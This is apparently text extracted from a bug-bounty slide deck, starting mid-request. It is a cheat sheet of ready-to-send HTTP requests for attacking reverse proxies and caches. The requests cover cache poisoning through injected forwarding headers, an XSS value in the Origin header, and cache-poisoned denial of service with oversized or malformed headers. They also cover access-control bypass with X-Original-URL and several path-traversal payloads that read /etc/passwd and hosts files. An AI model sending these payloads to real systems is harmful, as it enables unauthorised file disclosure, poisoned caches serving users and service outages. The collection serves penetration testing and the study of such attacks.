Host: www.company.com
User-Agent: Mozilla/5.0
Origin: '-alert(1)-'
Referer: https://previous.com/path
attacker
My Methodology
●
             Video
Try To Inject X-Forwarded-Host And X-Forwarded-Scheme e.g. X-Forwarded-Scheme: nothttps 
And X-Forwarded-Host: RandomString(10).id.burpcollaborator.net To Achieve Cache Poisoning
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Forwarded-Scheme: nothttps
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net
Referer: https://previous.com/path
attacker
My Methodology
●
             Video
Try To Inject X-Host e.g. X-Host: RandomString(10).id.burpcollaborator.net To 
Achieve Cache Poisoning OR XSS
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Host: RandomString(10).id.burpcollaborator.net
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Video
●
             Tweet
Try To Inject X-Oversized-Header-Number e.g.
X-Oversized-Header-1: xxx 20K xxx To Achieve Cache-Poisoned Denial-of-Service
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Oversized-Header-1: xxxxx 20K xxxx
X-Oversized-Header-2: xxxxx 20K xxxx
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
Try To Inject X-Metachar-Header e.g.
X-Metachar-Header: \n To Achieve Cache-Poisoned Denial-of-Service
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Metachar-Header: \n
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
Try To Inject X-HTTP-Method-Override e.g. X-HTTP-Method-Override: PUT To 
Achieve RCE OR Cache-Poisoned Denial-of-Service
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-HTTP-Method-Override: PUT
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Writeup
●
             Blog
Try To Inject X-Forwarded-Port e.g.
X-Forwarded-Port: 123 To Achieve Cache-Poisoned Denial-of-Service
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Forwarded-Port: 123
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
●
             Writeup
Try To Inject X-Forwarded-SSL e.g.
X-Forwarded-SSL: xxxx To Achieve Cache-Poisoned Denial-of-Service
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Forwarded-SSL: off
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
Try To Inject Max-Forwards e.g.
Max-Forwards: 0 To Achieve Cache-Poisoned Denial-of-Service
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Max-Forwards: 0
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
Try To Inject zTransfer-Encoding OR Transfer-Encoding e.g.
zTransfer-Encoding: xxxx To Achieve Cache-Poisoned Denial-of-Service
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
zTransfer-Encoding: xxxx
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
Try To Inject Accept_Encoding e.g.
Accept_Encoding: xxxx To Achieve Cache-Poisoned Denial-of-Service
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Accept_Encoding: xxxx
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
Try To Inject Range e.g.
Range: bytes=cow To Achieve Cache-Poisoned Denial-of-Service
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Range: bytes=cow
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
Try To Inject User-Agent e.g.
User-Agent: xxxx 20K xxxx To Achieve Cache-Poisoned Denial-of-Service
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: xxxx 20K xxxx
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
Try To Inject Keep-Alive , Transfer-Encoding , Trailer , Upgrade , Proxy-Authorization , TE 
Connection OR Proxy-Authenticate e.g. Connection: close, Cookie To Abuse Hop-By-Hop
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Connection: close, Cookie
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
Try To Add Headers e.g. X-Original-URL: /Internal-Endpoint , X-Override-URL: 
/Internal-Endpoint OR X-Rewrite-URL: /Internal-Endpoint To Bypass Blacklist
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Original-URL: /Internal-Endpoint
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Video
●
             Blog
●
             Writeup
Try To Inject ?%xx , %xx OR %xxx 20k xxx e.g. Endpoint-To-Proxy/%xx To
Do DOS Attack
GET /Endpoint-To-Proxy/%xxx 20k xxx HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
attacker
My Methodology
●
             Writeup
Try To Add Parameter With Value e.g. ?parameter=cache OR If There Is Parameters 
Try To Add Another e.g. lang=en&parameter=cache To Achieve Cache Poisoning
GET /Endpoint-To-Proxy?parameter=cache HTTP/1.1
Host: company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
attacker
My Methodology
●
             Video
Try To Add Parameter With Large Value e.g. ?parameter=xxx 20K xxx OR If There Is Parameters Try 
To Add Another e.g. lang=en&parameter=xxx 20K xxx To Achieve Cache Poisoning
GET /Endpoint-To-Proxy?parameter=xxxx 20K xxxx HTTP/1.1
Host: company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
attacker
My Methodology
●
             Video
Try To Add _Parameter With Value e.g. ?_parameter=cache OR If There Is 
Parameters Try To Add Another e.g. lang=en&_parameter=cache To Achieve Cache 
Poisoning
GET /Endpoint-To-Proxy?_parameter=cache HTTP/1.1
Host: company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
attacker
My Methodology
●
             Video
Try To Add ;Parameter With Value e.g. ;parameter=cache OR If There Is Parameters 
Try To Add Another e.g. lang=en;parameter=cache To Achieve Cache Poisoning
GET /Endpoint-To-Proxy;parameter=cache HTTP/1.1
Host: company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
attacker
My Methodology
●
             Video
Try To Add Body e.g. parameter=cache To Your Request Without Change GET To 
Achieve Cache Poisoning
GET /Endpoint-To-Proxy HTTP/1.1
Host: company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
parameter=cache
attacker
My Methodology
●
             Video
Try To Change Method To POST And Add Body e.g. _Parameter With Value e.g. 
_parameter=cache To Achieve Cache Poisoning
POST /Endpoint-To-Proxy HTTP/1.1
Host: company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
_parameter=cache
attacker
My Methodology
●
             Video
If There Is Nginx As Reverse Proxy AND Weblogic As Backend Try To Use /#/../ To Change Route Of 
Endpoints e.g.  Endpoint-To-Proxy/#/../../../../../../../../../etc/passwd To Get Content Of etc/passwd File
GET /Endpoint-To-Proxy/#/../../../../../../../../../../etc/passwd HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Slides
If There Is Nginx As Reverse Proxy AND Weblogic As Backend Try To Use ;/../ To Change Route Of 
Endpoints e.g. /../../../../../../../../../etc/passwd;/../Endpoint-To-Proxy To Get Content Of etc/passwd File
GET /../../../../../../../etc/passwd;/../Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Slides
If There Is Nginx As Reverse Proxy Try To Use ../ To Change Route Of Endpoints
e.g. Endpoint-To-Proxy../../../../../../../../etc/passwd To Get Content Of etc/passwd File
GET /Endpoint-To-Proxy../../../../../../../etc/passwd HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Slides
●
             Blog
●
             Blog
●
             Video
●
             Video
Try To Inject ../../../../../../../../../../etc/passwd e.g. 
Endpoint-To-Proxy/../../../../../../../../etc/passwd To Get Content Of etc/passwd File
GET /Endpoint-To-Proxy/../../../../../../../etc/passwd HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Writeup
Try To Inject ..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd e.g. Endpoint-To-Proxy
/..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd To Get Content Of etc/passwd File
GET /Endpoint-To-Proxy/..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Writeup
Try To Inject \..\.\..\.\..\.\..\.\..\.\..\.\Internal-Endpoint OR 
\..\..\..\.\..\..\Internal-Endpoint\..\..\..\..\..\etc\passwd%3F.jsTo Expose Internal Information 
GET /Endpoint-To-Proxy\..\.\..\.\..\.\..\.\Internal-Endpoint HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
●
             Video
●
             Blog
Try To Inject %255c%255c%255c%255c%255c%255c..%255c..%255c..%255c
..%255c..%255c..%255c/Internal-Endpoint To Expose Internal Information 
GET /Endpoint-To-Proxy/
        %255c%255c%255c%255c%255c%255c..%255c..%255c..
        %255c..%255c..%255c..%255c/Internal-Endpoint HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Video
Try To Inject /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f
..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts To Get File etc/hosts
GET /Endpoint-To-Proxy//
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%25
2f..%252f..%252f..%252f..%252f..%252f..%252f..%25
2f..%252fwindows/System32/drivers/etc/hosts HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Writeup
Let’s Assume There Is Routing To Pulse Secure SSL VPN So , Try To Inject dana-na/../dana
/html5acc/guacamole/../../../../../../etc/hosts?/dana/html5acc/guacamole/# To Get File etc/hosts
GET /Endpoint-To-Proxy/dana-na/../dana/html5acc/guacamole/../
../../../../../etc/hosts?/dana/html5acc/guacamole/# HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Writeup
●